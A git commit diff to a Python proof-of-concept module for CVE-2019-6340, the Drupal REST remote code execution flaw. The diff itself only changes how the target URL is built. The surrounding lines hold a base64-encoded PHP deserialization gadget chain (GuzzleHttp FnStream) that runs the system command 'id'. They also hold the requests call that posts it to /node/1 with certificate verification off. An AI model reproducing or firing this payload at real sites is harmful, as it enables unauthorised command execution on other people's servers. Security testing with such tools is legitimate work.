1d1e0899b513af80addb3650f95ead49536045d1
RabbitMask <37649548+rabbitmask@users.noreply.github.com>
2022-04-02 12:23:22 +0800

    Update CVE_2019_6340.py

--- Moudle/Drupal/CVE_2019_6340.py
+++ Moudle/Drupal/CVE_2019_6340.py
@@ -22,7 +22,7 @@ def poc(target):
     list = ["/node/1?_format=hal_json",
              "ewogICJsaW5rIjogWwogICAgewogICAgICAidmFsdWUiOiAibGluayIsCiAgICAgICJvcHRpb25zIjogIk86MjQ6XCJHdXp6bGVIdHRwXFxQc3I3XFxGblN0cmVhbVwiOjI6e3M6MzM6XCJcdTAwMDBHdXp6bGVIdHRwXFxQc3I3XFxGblN0cmVhbVx1MDAwMG1ldGhvZHNcIjthOjE6e3M6NTpcImNsb3NlXCI7YToyOntpOjA7TzoyMzpcIkd1enpsZUh0dHBcXEhhbmRsZXJTdGFja1wiOjM6e3M6MzI6XCJcdTAwMDBHdXp6bGVIdHRwXFxIYW5kbGVyU3RhY2tcdTAwMDBoYW5kbGVyXCI7czoyOlwiaWRcIjtzOjMwOlwiXHUwMDAwR3V6emxlSHR0cFxcSGFuZGxlclN0YWNrXHUwMDAwc3RhY2tcIjthOjE6e2k6MDthOjE6e2k6MDtzOjY6XCJzeXN0ZW1cIjt9fXM6MzE6XCJcdTAwMDBHdXp6bGVIdHRwXFxIYW5kbGVyU3RhY2tcdTAwMDBjYWNoZWRcIjtiOjA7fWk6MTtzOjc6XCJyZXNvbHZlXCI7fX1zOjk6XCJfZm5fY2xvc2VcIjthOjI6e2k6MDtyOjQ7aToxO3M6NzpcInJlc29sdmVcIjt9fSIKICAgIH0KICBdLAogICJfbGlua3MiOiB7CiAgICAidHlwZSI6IHsKICAgICAgImhyZWYiOiAiaHR0cDovL2xvY2FsaG9zdC9yZXN0L3R5cGUvc2hvcnRjdXQvZGVmYXVsdCIKICAgIH0KICB9Cn0KCg=="]
     try:
-        URL = "http://" + target + list[0]
+        URL = target + list[0]
         data = base64.b64decode(list[1])
         res = requests.post(URL, data=data, headers=headers, verify=False)
         response = res.text
